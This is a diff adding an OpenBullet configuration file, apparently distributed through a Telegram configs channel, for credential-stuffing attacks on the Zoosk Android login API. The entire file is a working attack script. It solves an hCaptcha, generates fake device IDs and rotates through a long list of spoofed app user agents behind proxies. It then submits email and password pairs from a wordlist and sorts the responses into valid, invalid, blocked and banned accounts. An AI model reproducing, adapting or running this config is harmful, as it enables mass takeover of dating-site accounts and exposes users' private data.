@@ -1,0 +1,90 @@
+[SETTINGS]
+{
+  "Name": "Zoosk Android",
+  "SuggestedBots": 50,
+  "MaxCPM": 0,
+  "LastModified": "2022-03-29T18:16:24.3257044+04:30",
+  "AdditionalInfo": "",
+  "RequiredPlugins": [],
+  "Author": "@wanted_boy",
+  "Version": "1.2.2",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+SOLVECAPTCHA HCaptcha "9a9b069e-723e-4522-81e6-2b244ff63649" "https://9a9b069e-723e-4522-81e6-2b244ff63649.android-sdk.hcaptcha.com/" 
+
+#Len FUNCTION Length "<SOLUTION>" -> VAR "Len" 
+
+IF "<Len>" LessThan "50"
+SET STATUS RETRY
+ENDIF
+BEGIN SCRIPT JavaScript
+function generateString(length) {
+ var result = '';
+ var characters = 'abcdefghijklmnopqrstuvwxyz0123456789';
+ var charactersLength = characters.length;
+ for ( var i = 0; i < length; i++ ){
+        result += characters.charAt(Math.floor(Math.random() * charactersLength));
+    }
+    return result;
+}
+var Output = generateString(32);
+var userAgents = ["ZooskAndroid/501 (Linux; U; Android 4.1.2; en-us; GT-I9100; Build/JZO54K)","ZooskAndroid/501 (Linux; U; Android 6.0.1; en-us; SM-G935S; Build/MMB29K)","ZooskAndroid/501 (Linux; U; Android 6.0.1; en-us; SM-G920V; Build/MMB29K)","ZooskAndroid/501 (Linux; U; Android 5.1.1; en-us; SM-G928X; Build/LMY47X)","ZooskAndroid/501 (Linux; U; Android 6.0; en-us; HTC One X10; Build/MRA58K)","ZooskAndroid/501 (Linux; U; Android 6.0; en-us; HTC One M9; Build/MRA58K)","ZooskAndroid/501 (Linux; U; Android 8.0.0; en-us; SM-G960F; Build/R16NW) ","ZooskAndroid/561 (Linux; U; Android 7.1.1; en-us; G8231; Build/41.2.A.0.219)","ZooskAndroid/561 (Linux; U; Android 6.0.1; en-us; E6653; Build/32.2.A.0.253) ","ZooskAndroid/561 (Linux; U; Android 7.0; en-us; SM-G930V; Build/NRD90M)","ZooskAndroid/561 (Linux; U; Android 6.0; en-us; Lenovo K50a40; Build/MRA58K)","ZooskAndroid/561 (Linux; U; Android 6.0.1; en-us; RedMi Note 5; Build/RB3N5C)","ZooskAndroid/561 (Linux; U; Android 7.1.2; en-us; AFTMM; Build/NS6264)","ZooskAndroid/561 (Linux; U; Android 9; en-us; SM-G960F; Build/PPR1.180610.011)","ZooskAndroid/561 (Linux; U; Android 7.1.1; en-us; SM-T555; Build/NMF26X)","ZooskAndroid/561 (Linux; U; Android 7.1; en-us; Mi A1; Build/N2G47H)","ZooskAndroid/561 (Linux; U; Android 7.0; en-us; SM-G570M; Build/NRD90M)","ZooskAndroid/561 (Linux; U; Android 8.0.0; en-us; SM-G930F; Build/R16NW)","ZooskAndroid/561 (Linux; U; Android 9; en-us; SM-G965F; Build/PPR1.180610.011)","ZooskAndroid/561 (Linux; U; Android 8.0.0; en-us; SM-N9500; Build/R16NW)","ZooskAndroid/561 (Linux; U; Android 7.1.2; en-us; vivo y35; Build/N2G48B)","ZooskAndroid/561 (Linux; U; Android 9; en-us; SAMSUNG SM-G960U; Build/JSS15J)","ZooskAndroid/561 (Linux; U; Android 6.0.1; en-us; Nexus 6P; Build/MMB29P)","ZooskAndroid/561 (Linux; U; Android 7.1.1; en-us; G8231; Build/41.2.A.0.219)","ZooskAndroid/561 (Linux; U; Android 8.0.0; en-us; SM-G960F; Build/R16NW)","ZooskAndroid/561 (Linux; U; Android 7.0; en-us; SM-G930V; Build/NRD90M)","ZooskAndroid/561 (Linux; U; Android 6.0; en-us; Lenovo K50a40; Build/MRA58K)","ZooskAndroid/561 (Linux; U; Android 6.0.1; en-us; RedMi Note 5; Build/RB3N5C)","ZooskAndroid/561 (Linux; U; Android 9; en-us; SM-G960F; Build/PPR1.180610.011)","ZooskAndroid/561 (Linux; U; Android 7.0; en-us; SM-G570M; Build/NRD90M)","ZooskAndroid/561 (Linux; U; Android 8.0.0; it-it; SM-G960F; Build/R16NW) ","ZooskAndroid/561 (Linux; U; Android 7.0; it-it; SM-G930V; Build/NRD90M)","ZooskAndroid/561 (Linux; U; Android 7.1.2; it-it; AFTA; Build/NS6264)","ZooskAndroid/561 (Linux; U; Android 7.1; it-it; vivo 1716; Build/N2G47H)","ZooskAndroid/561 (Linux; U; Android 7.0; it-it; SAMSUNG SM-G610M; Build/NRD90M)","ZooskAndroid/561 (Linux; U; Android 7.0; it-it; TRT-LX2; Build/HUAWEITRT-LX2)","ZooskAndroid/561 (Linux; U; Android 7.1.1; de-de; G8231; Build/41.2.A.0.219)","ZooskAndroid/561 (Linux; U; Android 6.0; de-de; Lenovo K50a40; Build/MRA58K)","ZooskAndroid/561 (Linux; U; Android 9; de-de; SAMSUNG SM-G960U; Build/LMY47V)","ZooskAndroid/561 (Linux; U; Android 9; de-de; SAMSUNG SM-G960U; Build/JSS15J)","ZooskAndroid/561 (Linux; U; Android 7.0; en-us; SM-G930V; Build/NRD90M)","ZooskAndroid/561 (Linux; U; Android 8.0.0; en-us; SM-N9500; Build/R16NW)","ZooskAndroid/561 (Linux; U; Android 6.0.1; zh-CN; F5121; Build/34.0.A.1.247)","ZooskAndroid/561 (Linux; U; Android 7.0; it-it; SM-G930V; Build/NRD90M)","ZooskAndroid/561 (Linux; U; Android 6.0; it-it; Lenovo K50a40; Build/MRA58K)","ZooskAndroid/561 (Linux; U; Android 6.0.1; it-it; RedMi Note 5; Build/RB3N5C)","ZooskAndroid/561 (Linux; U; Android 7.1.2; it-it; AFTMM; Build/NS6265)","ZooskAndroid/633 (Linux; U; Android 6.0; ko-kr; CAM-L21; Build/HUAWEICAM-L21)","ZooskAndroid/633 (Linux; U; Android 7.0; ko-kr; TRT-LX2; Build/HUAWEITRT-LX2)","ZooskAndroid/633 (Linux; U; Android 5.0; ko-kr; SAMSUNG SM-G900F; Build/LRX21T)","ZooskAndroid/633 (Linux; U; Android 5.1; ko-kr; A1601; Build/LMY47","ZooskAndroid/633 (Linux; U; Android 6.0; ko-kr; MYA-L22; Build/HUAWEIMYA-L22)","ZooskAndroid/633 (Linux; U; Android 7.0; ko-kr; SAMSUNG SM-G610M; Build/NRD90M)","ZooskAndroid/633 (Linux; U; Android 7.1; ko-kr; vivo 1716; Build/N2G47H)","ZooskAndroid/633 (Linux; U; Android 7.1.2; ko-kr; AFTA; Build/NS6264)","ZooskAndroid/633 (Linux; U; Android 7.0; ko-kr; SM-G570M; Build/NRD90M)","ZooskAndroid/633 (Linux; U; Android 6.0.1; ko-kr; SM-J700M; Build/MMB29K)","ZooskAndroid/633 (Linux; U; Android 9; ko-kr; SAMSUNG SM-G960U; Build/JSS15J)","ZooskAndroid/633 (Linux; U; Android 7.1.2; ko-kr; vivo y35; Build/N2G48B)","ZooskAndroid/633 (Linux; U; Android 6.0.1; ko-kr; vivo 1603 Build/MMB29M)","ZooskAndroid/633 (Linux; U; Android 8.0.0; ko-kr; SM-N9500; Build/R16NW)","ZooskAndroid/633 (Linux; U; Android 6.0.1; ko-kr; SM-G532M; Build/MMB29T)","ZooskAndroid/633 (Linux; U; Android 6.0.1; ko-kr; CPH1607; Build/MMB29M)","ZooskAndroid/633 (Linux; U; Android 9; ko-kr; SM-G965F; Build/PPR1.180610.011)","ZooskAndroid/633 (Linux; U; Android 9; ko-kr; SAMSUNG SM-G960U; Build/LMY47V)","ZooskAndroid/633 (Linux; U; Android 6.0; ko-kr; Nexus 5; Build/MRA58N)","ZooskAndroid/633 (Linux; U; Android 8.0.0; ko-kr; SM-G930F; Build/R16NW)","ZooskAndroid/633 (Linux; U; Android 7.0; ko-kr; SM-G570M; Build/NRD90M)","ZooskAndroid/633 (Linux; U; Android 7.0; ko-kr; SM-G892A; Build/NRD90M)","ZooskAndroid/633 (Linux; U; Android 7.1.1; ko-kr; SM-T555; Build/NMF26X)","ZooskAndroid/633 (Linux; U; Android 9; ko-kr; SM-G960F; Build/PPR1.180610.011)","ZooskAndroid/633 (Linux; U; Android 7.1.2; ko-kr; AFTMM; Build/NS6265)","ZooskAndroid/633 (Linux; U; Android 5.1.1; ko-kr; Nexus 5; Build/LMY48B)","ZooskAndroid/633 (Linux; U; Android 7.1; it-it; vivo 1716; Build/N2G47H)","ZooskAndroid/633 (Linux; U; Android 5.1.1; de-de; Nexus 5; Build/LMY48B)","ZooskAndroid/633 (Linux; U; Android 9; it-it; SAMSUNG SM-G960U; Build/JSS15J)","ZooskAndroid/633 (Linux; U; Android 8.0.0; it-it; SM-N9500; Build/R16NW)","ZooskAndroid/633 (Linux; U; Android 9; it-it; SM-G965F; Build/PPR1.180610.011)","ZooskAndroid/633 (Linux; U; Android 9; it-it; SAMSUNG SM-G960U; Build/LMY47V)","ZooskAndroid/633 (Linux; U; Android 8.0.0; it-it; SM-G930F; Build/R16NW)","ZooskAndroid/633 (Linux; U; Android 7.0; it-it; SM-G570M; Build/NRD90M)","ZooskAndroid/633 (Linux; U; Android 7.1.1; it-it; SM-T555; Build/NMF26X)","ZooskAndroid/633 (Linux; U; Android 9; it-it; SM-G950F; Build/PPR1.180610.011)","ZooskAndroid/633 (Linux; U; Android 9; it-it; SM-G960F; Build/PPR1.180610.011)","ZooskAndroid/633 (Linux; U; Android 5.1.1; it-it; Nexus 5; Build/LMY48B)","ZooskAndroid/633 (Linux; U; Android 9; en-us; SM-G950F; Build/PPR1.180610.011)","ZooskAndroid/633 (Linux; U; Android 7.1.2; en-us; AFTMM; Build/NS6264)","ZooskAndroid/633 (Linux; U; Android 7.1.2; en-us; AFTMM; Build/NS6265)","ZooskAndroid/633 (Linux; U; Android 7.0; en-us; SM-G930V; Build/NRD90M)","ZooskAndroid/633 (Linux; U; Android 8.0.0; en-us; SM-G960F; Build/R16NW)","ZooskAndroid/633 (Linux; U; Android 6.0; en-us; HTC One M9; Build/MRA58K)","ZooskAndroid/633 (Linux; U; Android 7.1.1; en-us; G8231; Build/41.2.A.0.219)","ZooskAndroid/502 (Linux; U; Android 6.0.1; ko-kr; Lenovo-A6020l36; Build/MMB29M)","ZooskAndroid/502 (Linux; U; Android 7.1.2; ko-kr; vivo y35; Build/N2G48B)","ZooskAndroid/502 (Linux; U; Android 8.0.0; ko-kr; SM-N9500; Build/R16NW)","ZooskAndroid/501 (Linux; U; Android 5.1.1; en-us; Nexus 5; Build/LMY48B)","ZooskAndroid/520 (Linux; U; Android 6.0.1; ko-kr; SM-J700M; Build/MMB29K)","ZooskAndroid/520 (Linux; U; Android 9; ko-kr; SAMSUNG SM-G960U; Build/JSS15J)","ZooskAndroid/520 (Linux; U; Android 6.0.1; ko-kr; vivo 1603 Build/MMB29M)","ZooskAndroid/520 (Linux; U; Android 8.0.0; ko-kr; SM-N9500; Build/R16NW)","ZooskAndroid/520 (Linux; U; Android 9; ko-kr; SM-G950F; Build/PPR1.180610.011)","ZooskAndroid/520 (Linux; U; Android 9; ko-kr; SM-G960F; Build/PPR1.180610.011)","ZooskAndroid/520 (Linux; U; Android 6.0; ko-kr; Lenovo K50a40; Build/MRA58K)","ZooskAndroid/520 (Linux; U; Android 7.0; ko-kr; SM-G930V; Build/NRD90M)","ZooskAndroid/520 (Linux; U; Android 8.0.0; ko-kr; SM-G960F; Build/R16NW) ","ZooskAndroid/520 (Linux; U; Android 6.0; ko-kr; HTC One M9; Build/MRA58K)","ZooskAndroid/520 (Linux; U; Android 6.0; ko-kr; HTC One X10; Build/MRA58K)","ZooskAndroid/520 (Linux; U; Android 6.0.1; ko-kr; E6653; Build/32.2.A.0.253)","ZooskAndroid/520 (Linux; U; Android 7.1.1; ko-kr; G8231; Build/41.2.A.0.219)","ZooskAndroid/520 (Linux; U; Android 6.0.1; ko-kr; Nexus 6P; Build/MMB29P)","ZooskAndroid/520 (Linux; U; Android 7.0; zh-CN; TRT-LX2; Build/HUAWEITRT-LX2)","ZooskAndroid/520 (Linux; U; Android 6.0; zh-CN; MYA-L22; Build/HUAWEIMYA-L22)","ZooskAndroid/520 (Linux; U; Android 7.1; zh-CN; vivo 1716; Build/N2G47H)","ZooskAndroid/520 (Linux; U; Android 7.1.2; zh-CN; AFTA; Build/NS6264)","ZooskAndroid/520 (Linux; U; Android 7.0; zh-CN; SM-G570M; Build/NRD90M)","ZooskAndroid/520 (Linux; U; Android 6.0.1; zh-CN; SM-J700M; Build/MMB29K)","ZooskAndroid/520 (Linux; U; Android 9; zh-CN; SAMSUNG SM-G960U; Build/JSS15J)","ZooskAndroid/520 (Linux; U; Android 6.0.1; zh-CN; Redmi 4A; Build/MMB29M)","ZooskAndroid/520 (Linux; U; Android 6.0.1; zh-CN; vivo 1603 Build/MMB29M)","ZooskAndroid/520 (Linux; U; Android 8.0.0; zh-CN; SM-N9500; Build/R16NW)","ZooskAndroid/520 (Linux; U; Android 9; zh-CN; SM-G965F; Build/PPR1.180610.011)","ZooskAndroid/520 (Linux; U; Android 9; zh-CN; SAMSUNG SM-G960U; Build/LMY47V)","ZooskAndroid/520 (Linux; U; Android 8.0.0; zh-CN; SM-G930F; Build/R16NW)","ZooskAndroid/520 (Linux; U; Android 7.1; zh-CN; Mi A1; Build/N2G47H)","ZooskAndroid/520 (Linux; U; Android 9; zh-CN; SM-G950F; Build/PPR1.180610.011)","ZooskAndroid/520 (Linux; U; Android 9; zh-CN; SM-G960F; Build/PPR1.180610.011)","ZooskAndroid/520 (Linux; U; Android 7.1.2; zh-CN; AFTMM; Build/NS6264)","ZooskAndroid/520 (Linux; U; Android 6.0.1; zh-CN; RedMi Note 5; Build/RB3N5C)","ZooskAndroid/520 (Linux; U; Android 6.0; zh-CN; Lenovo K50a40; Build/MRA58K)","ZooskAndroid/520 (Linux; U; Android 7.0; zh-CN; SM-G930V; Build/NRD90M)","ZooskAndroid/520 (Linux; U; Android 7.1.1; zh-CN; G8231; Build/41.2.A.0.219)","ZooskAndroid/520 (Linux; U; Android 6.0.1; zh-CN; Nexus 6P; Build/MMB29P)","ZooskAndroid/633 (Linux; U; Android 7.1.2; ko-kr; AFTA; Build/NS6264)","ZooskAndroid/633 (Linux; U; Android 7.1; ko-kr; vivo 1716; Build/N2G47H)","ZooskAndroid/633 (Linux; U; Android 7.1; it-it; Mi A1; Build/N2G47H)","ZooskAndroid/633 (Linux; U; Android 7.0; it-it; SM-G892A; Build/NRD90M)","ZooskAndroid/633 (Linux; U; Android 7.0; it-it; SM-G610M; Build/NRD90M)","ZooskAndroid/633 (Linux; U; Android 7.1.1; it-it; SM-T555; Build/NMF26X)","ZooskAndroid/633 (Linux; U; Android 6.0; it-it; vivo 1713; Build/MRA58K)","ZooskAndroid/633 (Linux; U; Android 9; it-it; SM-G950F; Build/PPR1.180610.011)","ZooskAndroid/633 (Linux; U; Android 6.0.1; it-it; SM-G532G; Build/MMB29T)","ZooskAndroid/633 (Linux; U; Android 7.1.2; it-it; AFTMM; Build/NS6264)","ZooskAndroid/633 (Linux; U; Android 7.0; it-it; SM-G930V; Build/NRD90M)","ZooskAndroid/633 (Linux; U; Android 6.0.1; en-us; Redmi 4A; Build/MMB29M)","ZooskAndroid/633 (Linux; U; Android 7.1.2; en-us; vivo y35; Build/N2G48B)","ZooskAndroid/633 (Linux; U; Android 6.0.1; en-us; vivo 1603 Build/MMB29M)","ZooskAndroid/633 (Linux; U; Android 8.0.0; en-us; SM-N9500; Build/R16NW)","ZooskAndroid/633 (Linux; U; Android 6.0.1; en-us; CPH1607; Build/MMB29M)","ZooskAndroid/633 (Linux; U; Android 9; en-us; SAMSUNG SM-G960U; Build/LMY47V)","ZooskAndroid/633 (Linux; U; Android 6.0; en-us; Nexus 5; Build/MRA58N)","ZooskAndroid/633 (Linux; U; Android 8.0.0; en-us; SM-G930F; Build/R16NW)","ZooskAndroid/633 (Linux; U; Android 7.0; en-us; SM-G570M; Build/NRD90M)","ZooskAndroid/633 (Linux; U; Android 7.0; en-us; SM-G892A; Build/NRD90M)","ZooskAndroid/633 (Linux; U; Android 7.1.1; en-us; SM-T555; Build/NMF26X)","ZooskAndroid/633 (Linux; U; Android 9; en-us; SM-G950F; Build/PPR1.180610.011)","ZooskAndroid/633 (Linux; U; Android 9; en-us; SM-G960F; Build/PPR1.180610.011)","ZooskAndroid/633 (Linux; U; Android 7.1.2; en-us; AFTMM; Build/NS6264)","ZooskAndroid/633 (Linux; U; Android 7.1.2; en-us; AFTMM; Build/NS6265)","ZooskAndroid/633 (Linux; U; Android 6.0.1; en-us; RedMi Note 5; Build/RB3N5C)","ZooskAndroid/633 (Linux; U; Android 7.0; en-us; SM-G930V; Build/NRD90M)","ZooskAndroid/633 (Linux; U; Android 8.0.0; en-us; SM-G960F; Build/R16NW)","ZooskAndroid/633 (Linux; U; Android 6.0; en-us; HTC One M9; Build/MRA58K)","ZooskAndroid/633 (Linux; U; Android 5.1.1; it-it; Nexus 5; Build/LMY48B)","ZooskAndroid/633 (Linux; U; Android 6.0.1; zh-CN; F5121; Build/34.0.A.1.247)","ZooskAndroid/633 (Linux; U; Android 7.1; en-us; vivo 1716; Build/N2G47H)","ZooskAndroid/633 (Linux; U; Android 9; en-us; SAMSUNG SM-G960U; Build/JSS15J)","ZooskAndroid/633 (Linux; U; Android 5.1; en-us; A37f; Build/LMY47V)","ZooskAndroid/633 (Linux; U; Android 7.1.1; en-us; SM-T555; Build/NMF26X)","ZooskAndroid/633 (Linux; U; Android 9; en-us; SM-G960F; Build/PPR1.180610.011)","ZooskAndroid/633 (Linux; U; Android 7.1.2; en-us; AFTMM; Build/NS6265)","ZooskAndroid/633 (Linux; U; Android 7.1.2; ko-kr; vivo y35; Build/N2G48B)","ZooskAndroid/633 (Linux; U; Android 6.0.1; ko-kr; CPH1607; Build/MMB29M)","ZooskAndroid/633 (Linux; U; Android 7.1; ko-kr; Mi A1; Build/N2G47H)","ZooskAndroid/633 (Linux; U; Android 9; ko-kr; SM-G960F; Build/PPR1.180610.011)","ZooskAndroid/633 (Linux; U; Android 6.0.1; ko-kr; SM-G920V; Build/MMB29K)","ZooskAndroid/633 (Linux; U; Android 6.0.1; ko-kr; SM-G935S; Build/MMB29K)","ZooskAndroid/633 (Linux; U; Android 7.0; zh-CN; TRT-LX2; Build/HUAWEITRT-LX2)","ZooskAndroid/633 (Linux; U; Android 7.0; zh-CN; SM-G892A; Build/NRD90M)","ZooskAndroid/633 (Linux; U; Android 7.1.1; zh-CN; SM-T555; Build/NMF26X)","ZooskAndroid/633 (Linux; U; Android 6.0.1; zh-CN; RedMi Note 5; Build/RB3N5C)","ZooskAndroid/633 (Linux; U; Android 6.0; zh-CN; HTC One X10; Build/MRA58K)","ZooskAndroid/633 (Linux; U; Android 7.1.1; zh-CN; G8231; Build/41.2.A.0.219)","ZooskAndroid/633 (Linux; U; Android 6.0.1; zh-CN; Nexus 6P; Build/MMB29P)","ZooskAndroid/633 (Linux; U; Android 7.0; en-gb; TRT-LX2; Build/HUAWEITRT-LX2)","ZooskAndroid/633 (Linux; U; Android 7.1.2; en-gb; AFTA; Build/NS6264)","ZooskAndroid/633 (Linux; U; Android 7.1.2; en-gb; vivo y35; Build/N2G48B)","ZooskAndroid/633 (Linux; U; Android 7.1; en-gb; Mi A1; Build/N2G47H)","ZooskAndroid/633 (Linux; U; Android 5.1.1; en-gb; SM-N750K; Build/LMY47X)","ZooskAndroid/633 (Linux; U; Android 7.0; nl-nl; TRT-LX2; Build/HUAWEITRT-LX2)","ZooskAndroid/633 (Linux; U; Android 6.0; nl-nl; CAM-L21; Build/HUAWEICAM-L21)","ZooskAndroid/633 (Linux; U; Android 8.0.0; nl-nl; SM-G930F; Build/R16NW)"];
+var userAgent = userAgents[Math.floor(Math.random()*userAgents.length)];
+END SCRIPT -> VARS "Output,userAgent"
+
+#Post REQUEST POST "https://api-android.zoosk.com/v5?rpc=config/get&product=4&format=json&locale=en_GB&product=4&format=json&locale=en_GB" 
+  CONTENT "client_name=android&client_version=633&udid=<Output>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Host: api-android.zoosk.com" 
+  HEADER "User-Agent: <userAgent>" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+
+#deviceId PARSE "<SOURCE>" JSON "response.data.z_device_id" JTokenParsing=TRUE -> VAR "deviceId" 
+
+#Login REQUEST POST "https://api-android.zoosk.com/v4.0/api.php?rpc=login%2Fgeneral_v43&product=4&format=json&locale=en_GB&z_device_id=<deviceId>" EncodeContent=TRUE 
+  CONTENT "login=<USER>&password=<PASS>&udid=<Output>&hCaptcha_Token=<SOLUTION>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Host: api-android.zoosk.com" 
+  HEADER "User-Agent: <userAgent>" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "We're sorry, the email and password combination you entered doesn't match." 
+  KEYCHAIN Success OR 
+    KEY "Welcome to Zoosk!" 
+  KEYCHAIN Custom "BLOCKED" OR 
+    KEY "\"is_blocked\":true" 
+  KEYCHAIN Ban OR 
+    KEY "<RESPONSECODE>" EqualTo "403" 
+    KEY "Gone" 
+    KEY "Bad Request" 
+
+SET CAP "Author Telegram" "@wanted_boy"
+SET CAP "Telegram Channel" "https://t.me/OpenBulletConfigs"
+
